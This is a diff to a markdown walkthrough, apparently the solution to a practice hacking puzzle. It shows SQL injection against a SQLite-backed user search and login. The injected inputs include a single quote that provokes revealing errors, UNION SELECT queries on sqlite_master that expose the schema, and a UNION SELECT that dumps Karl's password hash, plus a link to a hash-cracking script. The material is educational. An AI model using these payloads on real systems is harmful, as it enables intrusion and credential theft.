@@ -1,15 +1,6 @@
 # Step 0
 
-Add some user to the database. Here we call them "Karl".
-
-## Query for searching for users
-This is something that we only know if we have access to the source code. It is included here for clarity. We assume that a hacker deduced that the query looks something like this.
-``` sql
-SELECT user FROM credentials WHERE user LIKE '%{}%'
-```
-The `{}` is replaced with the user input.
-
-The name of the table and the column are something that we will first need to find out.
+Add some user with a password to the database. Here we call them "Karl".
 
 # Step 1
 
@@ -20,73 +11,51 @@ We check if quotation marks are escaped when adding user input to the query.
 '
 ```
 
-## Query after Injection
-``` sql
-SELECT user FROM credentials WHERE user LIKE '%'%'
-```
+[Click "Search for users"]
 
 ## Result
 
-Error: unrecognized token: "'"
+Error: unrecognized token: "'" in SELECT user FROM credentials WHERE user LIKE '%'%' at offset 49
 
 ## Interpretation
 
-This input field is susceptible to SQL injection!
+This input field is susceptible to SQL injection! And moreover, it kindly tells us the query used:
+
+``` sql
+SELECT user FROM credentials WHERE user LIKE '%{}%'
+```
+
+(The `{}` denotes the user input.)
 
 # Step 2
 
-Now that we can inject arbitrary SQL code into the query, we use `UNION` to add more results to the users query. Here we want to find out some metadata. The `sqlite_master` table is a protected tablename in sqlcipher.
+Let's find out more about the database by also breaking the login request.
 
 ## Input
 ``` sql
-' UNION SELECT name FROM sqlite_master '
+'
 ```
 
-## Query after Injection
-``` sql
-SELECT user FROM credentials WHERE user LIKE '%' UNION SELECT name FROM sqlite_master '%'
-```
+[Click "Login"]
 
 ## Result
 
-The following users match your query: ["Karl", "credentials", "sqlite_autoindex_credentials_1"]
+Error: unrecognized token: "'''" in SELECT password_hash FROM credentials WHERE user = ''' at offset 51
 
 ## Interpretation
 
-The first result is the intended username. The second and third results are the names of tables stored in this database.
-
-The free floating `'%'` at the end of the query is simply ignored.
+The `credentials` table has a column called `password_hash`.
 
 # Step 3
 
-Now that we know the name of the table, we want to know the names of its columns. Everything after and including the `WHERE` is necessary such that the type of the result matches that of the user column, which by trial and error we find to be `TEXT NOT NULL`.
-
-## Input
-``` sql
-' UNION SELECT sql FROM sqlite_master WHERE sql IS NOT NULL AND sql LIKE '
-```
-
-## Query after Injection
-``` sql
-SELECT user FROM credentials WHERE user LIKE '%' UNION SELECT sql FROM sqlite_master WHERE sql IS NOT NULL AND sql LIKE '%'
-```
-
-## Result
-
-The following users match your query: ["CREATE TABLE credentials (\n        user TEXT NOT NULL PRIMARY KEY,\n        password_hash TEXT NOT NULL\n    )", "Karl"]
-
-## Interpretation
-
-The first search result is the command the table "credentials" was created with. It contains the information that it has column names "user" and "password_hash".
-
-# Step 3
-
-We know the names and types of the table and columns, it is time to extract the information we are looking for.
+We know the names and types of the table and columns, it is time to extract the information we are looking for. Use the `UNION` command to append another query:
 
 ## Input
 ``` sql
 ' UNION SELECT password_hash FROM credentials '
 ```
+
+[Click "Search for users"]
 
 ## Query after Injection
 ``` sql
@@ -99,4 +68,4 @@ The following users match your query: ["03ac674216f3e15c761ee1a5e255f067953623c8
 
 ## Interpretation
 
-This is the hashed password of Karl. From the length we can deduce that it is most probably a SHA-256 Hash.
+This is the hashed password of Karl. From the length we can deduce that it is most probably a SHA-256 Hash. A small [Python script](https://github.com/TheComamba/TinyHackingPuzzle/blob/main/puzzle_soulution/02_crack_numeric_password.py) will be enouth to break it.
